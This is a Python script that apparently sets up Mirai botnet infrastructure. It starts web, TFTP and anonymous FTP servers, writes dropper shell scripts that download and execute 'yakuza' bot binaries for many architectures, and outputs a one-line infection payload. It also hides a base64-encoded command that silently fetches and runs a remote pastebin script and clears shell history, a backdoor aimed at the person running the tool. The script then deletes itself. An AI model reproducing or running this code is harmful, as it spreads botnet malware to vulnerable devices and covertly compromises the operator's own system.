import subprocess, sys, urllib, time, base64, subprocess
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "yakuza"
exec_name = "wget.ssh"
bin_prefix = ""
bin_directory = "vi"
archs = ["x86.yakuza",               #1
"mips.yakuza",                       #2
"mpsl.yakuza",                       #3
"arm4.yakuza",                       #4
"arm5.yakuza",                       #5
"arm6.yakuza",                       #6
"arm7.yakuza",                       #7
"ppc.yakuza",                        #8
"m68k.yakuza",                       #9
"sh4.yakuza"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;37m[CC] INSTALLING WEB SERVER DEPENDENCIES")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37m[CC] CREATING .SH BINS")
time.sleep(3)
run('echo "#!/bin/bash" > /var/lib/tftpboot/tyakuza.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tyakuza.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tyakuza.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/tyakuza2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tyakuza2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tyakuza2.sh')
run('echo "#!/bin/bash" > /var/www/html/yakuza.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tyakuza2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tyakuza2.sh')
run('echo "#!/bin/bash" > /var/ftp/yakuza1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/yakuza1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/yakuza1.sh')
def exploitmake(cmd):
    subprocess.call(cmd, shell=True)
encoded = "Y2QgL3RtcDsgd2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvelltOHBWY3ogLU8gYSA+IC9kZXYvbnVsbCAyPiYxOyBjaG1vZCA3NzcgYTsgc2ggYSA+IC9kZXYvbnVsbCAyPiYxOyBybSAtcmYgYTsgaGlzdG9yeSAtYzsgY2xlYXI7"
exploit = str(base64.b64decode(encoded))
exploitmake(exploit)
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/yakuza.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/yakuza1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/tyakuza.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/tyakuza2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m[CC] BUILDING MIRAI PAYLOAD PAYLOAD")
time.sleep(3)
print("\x1b[0;37m[CC] FINISHED SETTING UP MIRAI PAYLOAD")
complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/yakuza.sh; curl -O http://" + ip + "/yakuza.sh; chmod 777 yakuza.sh; sh yakuza.sh; tftp " + ip + " -c get tyakuza.sh; chmod 777 tyakuza.sh; sh tyakuza.sh; tftp -r tyakuza2.sh -g " + ip + "; chmod 777 tyakuza2.sh; sh tyakuza2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " yakuza1.sh yakuza1.sh; sh yakuza1.sh; rm -rf yakuza.sh tyakuza.sh tyakuza2.sh yakuza1.sh; rm -rf *")
f = open("payload.txt","w+")
f.write(complete_payload)
f.close()
print("\x1b[0;37m[CC] YOUR MIRAI PAYLOAD OUTPUTTED TO: PAYLOAD.TXT")
time.sleep(3)
run("ulimit -u99999; ulimit -n99999")
run("clear")
run("rm -rf ~/payload.py")
exit()
